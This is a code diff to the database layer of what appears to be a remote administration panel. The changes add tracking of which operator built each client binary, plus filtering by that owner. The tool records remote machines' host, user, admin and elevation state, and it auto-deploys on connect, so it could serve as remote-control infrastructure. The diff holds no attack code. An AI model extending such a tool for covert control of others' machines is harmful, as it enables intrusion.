@@ -28,7 +28,9 @@ db.run(`
     last_seen INTEGER,
     online INTEGER,
     ping_ms INTEGER,
-    bookmarked INTEGER NOT NULL DEFAULT 0
+    bookmarked INTEGER NOT NULL DEFAULT 0,
+    build_tag TEXT,
+    built_by_user_id INTEGER
   );
 `);
 try {
@@ -51,6 +53,12 @@ try {
 } catch {}
 try {
   db.run(`ALTER TABLE clients ADD COLUMN bookmarked INTEGER NOT NULL DEFAULT 0`);
+} catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN build_tag TEXT`);
+} catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN built_by_user_id INTEGER`);
 } catch {}
 try {
   db.run(`ALTER TABLE clients ADD COLUMN enrollment_status TEXT NOT NULL DEFAULT 'pending'`);
@@ -99,6 +107,9 @@ db.run(
 );
 db.run(
   `CREATE INDEX IF NOT EXISTS idx_clients_ping_ms ON clients(ping_ms);`,
+);
+db.run(
+  `CREATE INDEX IF NOT EXISTS idx_clients_built_by_user_id ON clients(built_by_user_id);`,
 );
 try {
   db.run(`ALTER TABLE clients ADD COLUMN disconnect_reason TEXT`);
@@ -445,8 +456,8 @@ export function upsertClientRow(
 ) {
   const now = partial.lastSeen ?? Date.now();
   db.run(
-    `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram, is_admin, elevation, permissions)
-     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(?, 0), ?, ?)
+    `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, build_tag, built_by_user_id, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram, is_admin, elevation, permissions)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(?, 0), ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        hwid=COALESCE(excluded.hwid, clients.hwid),
        role=COALESCE(excluded.role, clients.role),
@@ -464,6 +475,8 @@ export function upsertClientRow(
        last_seen=excluded.last_seen,
        online=COALESCE(excluded.online, clients.online),
        ping_ms=COALESCE(excluded.ping_ms, clients.ping_ms),
+      build_tag=COALESCE(excluded.build_tag, clients.build_tag),
+      built_by_user_id=COALESCE(excluded.built_by_user_id, clients.built_by_user_id),
        enrollment_status=CASE WHEN excluded.enrollment_status <> 'pending' THEN excluded.enrollment_status ELSE clients.enrollment_status END,
        public_key=COALESCE(excluded.public_key, clients.public_key),
        key_fingerprint=COALESCE(excluded.key_fingerprint, clients.key_fingerprint),
@@ -491,6 +504,8 @@ export function upsertClientRow(
     now,
     partial.online ?? 0,
     partial.pingMs ?? null,
+    partial.buildTag ?? null,
+    partial.builtByUserId ?? null,
     partial.enrollmentStatus ?? "pending",
     partial.publicKey ?? null,
     partial.keyFingerprint ?? null,
@@ -779,6 +794,8 @@ export function listClients(filters: ListFilters): ListResult {
     osFilter,
     countryFilter,
     enrollmentFilter,
+    builtByUserId,
+    requireBuildOwner,
     allowedClientIds,
     deniedClientIds,
   } = filters;
@@ -816,6 +833,15 @@ export function listClients(filters: ListFilters): ListResult {
   if (countryFilter && countryFilter !== "all") {
     where.push("UPPER(COALESCE(country,'ZZ'))=?");
     params.push(countryFilter.toUpperCase());
+  }
+
+  if (typeof builtByUserId === "number") {
+    where.push("built_by_user_id=?");
+    params.push(builtByUserId);
+  }
+
+  if (requireBuildOwner) {
+    where.push("built_by_user_id IS NOT NULL");
   }
 
   if (Array.isArray(allowedClientIds)) {
@@ -871,7 +897,7 @@ export function listClients(filters: ListFilters): ListResult {
 
   const rows = db
     .query<any>(
-      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs, bookmarked, enrollment_status as enrollmentStatus, public_key as publicKey, key_fingerprint as keyFingerprint, cpu, gpu, ram, is_admin as isAdmin, elevation, permissions, disconnect_reason as disconnectReason, disconnect_detail as disconnectDetail
+      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs, bookmarked, build_tag as buildTag, built_by_user_id as builtByUserId, enrollment_status as enrollmentStatus, public_key as publicKey, key_fingerprint as keyFingerprint, cpu, gpu, ram, is_admin as isAdmin, elevation, permissions, disconnect_reason as disconnectReason, disconnect_detail as disconnectDetail
        FROM clients
        ${whereSql}
        ${orderBy}
@@ -897,6 +923,8 @@ export function listClients(filters: ListFilters): ListResult {
     pingMs: c.pingMs ?? null,
     online: c.online === 1,
     bookmarked: c.bookmarked === 1,
+    buildTag: c.buildTag || null,
+    builtByUserId: typeof c.builtByUserId === "number" ? c.builtByUserId : null,
     enrollmentStatus: c.enrollmentStatus || "pending",
     publicKey: c.publicKey || null,
     keyFingerprint: c.keyFingerprint || null,
@@ -1348,6 +1376,8 @@ export function lookupClientByPublicKey(
 export function getEnrollmentStats(opts?: {
   allowedClientIds?: string[];
   deniedClientIds?: string[];
+  builtByUserId?: number;
+  requireBuildOwner?: boolean;
 }): {
   pending: number;
   approved: number;
@@ -1356,15 +1386,28 @@ export function getEnrollmentStats(opts?: {
   let sql = `SELECT COALESCE(enrollment_status,'pending') as status, COUNT(*) as c FROM clients`;
   const params: any[] = [];
 
+  const where: string[] = [];
   if (opts?.allowedClientIds) {
     if (opts.allowedClientIds.length === 0) return { pending: 0, approved: 0, denied: 0 };
     const placeholders = opts.allowedClientIds.map(() => "?").join(",");
-    sql += ` WHERE id IN (${placeholders})`;
+    where.push(`id IN (${placeholders})`);
     params.push(...opts.allowedClientIds);
-  } else if (opts?.deniedClientIds && opts.deniedClientIds.length > 0) {
+  }
+  if (opts?.deniedClientIds && opts.deniedClientIds.length > 0) {
     const placeholders = opts.deniedClientIds.map(() => "?").join(",");
-    sql += ` WHERE id NOT IN (${placeholders})`;
+    where.push(`id NOT IN (${placeholders})`);
     params.push(...opts.deniedClientIds);
+  }
+  if (typeof opts?.builtByUserId === "number") {
+    where.push("built_by_user_id = ?");
+    params.push(opts.builtByUserId);
+  }
+  if (opts?.requireBuildOwner) {
+    where.push("built_by_user_id IS NOT NULL");
+  }
+
+  if (where.length > 0) {
+    sql += ` WHERE ${where.join(" AND ")}`;
   }
 
   sql += ` GROUP BY enrollment_status`;
@@ -1435,6 +1478,8 @@ export function getAllPushSubscriptions(): PushSubscriptionRecord[] {
 export function getPendingClients(opts?: {
   allowedClientIds?: string[];
   deniedClientIds?: string[];
+  builtByUserId?: number;
+  requireBuildOwner?: boolean;
 }): {
   id: string;
   host: string | null;
@@ -1455,10 +1500,18 @@ export function getPendingClients(opts?: {
     const placeholders = opts.allowedClientIds.map(() => "?").join(",");
     sql += ` AND id IN (${placeholders})`;
     params.push(...opts.allowedClientIds);
-  } else if (opts?.deniedClientIds && opts.deniedClientIds.length > 0) {
+  }
+  if (opts?.deniedClientIds && opts.deniedClientIds.length > 0) {
     const placeholders = opts.deniedClientIds.map(() => "?").join(",");
     sql += ` AND id NOT IN (${placeholders})`;
     params.push(...opts.deniedClientIds);
+  }
+  if (typeof opts?.builtByUserId === "number") {
+    sql += ` AND built_by_user_id = ?`;
+    params.push(opts.builtByUserId);
+  }
+  if (opts?.requireBuildOwner) {
+    sql += ` AND built_by_user_id IS NOT NULL`;
   }
 
   sql += ` ORDER BY last_seen DESC`;
@@ -1477,6 +1530,22 @@ export function getPendingClients(opts?: {
       keyFingerprint: r.keyFingerprint,
       lastSeen: Number(r.lastSeen) || 0,
     }));
+}
+
+export function getClientBuildOwnership(
+  id: string,
+): { buildTag: string | null; builtByUserId: number | null } | null {
+  const row = db
+    .query<{ build_tag: string | null; built_by_user_id: number | null }>(
+      `SELECT build_tag, built_by_user_id FROM clients WHERE id=?`,
+    )
+    .get(id);
+  if (!row) return null;
+  return {
+    buildTag: row.build_tag ?? null,
+    builtByUserId:
+      typeof row.built_by_user_id === "number" ? row.built_by_user_id : null,
+  };
 }
 
 export type AutoDeployTrigger = "on_connect" | "on_first_connect" | "on_connect_once";
